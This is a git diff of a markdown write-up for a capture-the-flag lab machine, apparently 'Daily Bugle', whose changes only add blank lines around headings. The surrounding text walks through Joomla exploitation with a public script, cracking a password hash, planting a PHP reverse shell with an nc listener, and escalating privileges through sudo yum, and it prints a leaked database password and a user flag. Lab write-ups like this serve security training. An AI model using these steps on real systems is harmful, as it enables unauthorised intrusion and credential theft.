@@ -67,6 +67,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
 ```
 
 ## Directory Scanning
+
 We then proceed to find points of entry.
 Let's scan for directories using gobuster.
 ```shell
@@ -93,6 +94,7 @@ We discover some directories
 ![website](/assets/img/Posts/joomla.png)
 
 ## Joomla Vulnerability exploitation
+
 After some research, I found a python script that attacks joomla login to bruteforce credentials.
 You can find it here. `https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py`
 
@@ -122,6 +124,7 @@ python2 joomblah.py http://10.10.66.95
   -  Extracting sessions from fb9j5_session
 ```
 ## Password Cracking
+
 We get a user and a password hash.
 To crack it, we will use john the ripper.
 Store the hash `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm` in file.
@@ -139,6 +142,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.  
 ```
 ## User enumeration
+
 We have password and username.
 Using the credentials, we login to the dashboard.
 
@@ -153,7 +157,9 @@ You can find it here: `https://raw.githubusercontent.com/pentestmonkey/php-rever
 Edit it to match your machine ip and port.
 
 Listen on the port you chose. 
+
 ## Reverse Shell
+
 ```shell
 $ nc -nlvp 4444
 ```
@@ -206,7 +212,9 @@ public $host = 'localhost';
         public $user = 'root';
         public $password = 'nv5uz9r3ZEDzVjNu';
 ```
+
 ## SSH
+
 We then use the public password to login
 ```shell
  ssh jjameson@10.10.66.95       
@@ -223,7 +231,9 @@ user.txt
 27a260fe3cba712cfdedb1c86d80442e
 ```
 We have the user flag but we can't do much with the priliges we have.
+
 ## User Privilege
+
 Let's check  commands that we can execute as sudo.
 ```shell
 [jjameson@dailybugle ~]$ sudo -l
@@ -239,6 +249,7 @@ User jjameson may run the following commands on dailybugle:
 `(ALL) NOPASSWD: /usr/bin/yum`
 
 ## Binary Exploitation
+
 We head to GTFOBINS https://gtfobins.github.io/gtfobins/yum/
 
 We find the command to execute the `yum` binary as `sudo`
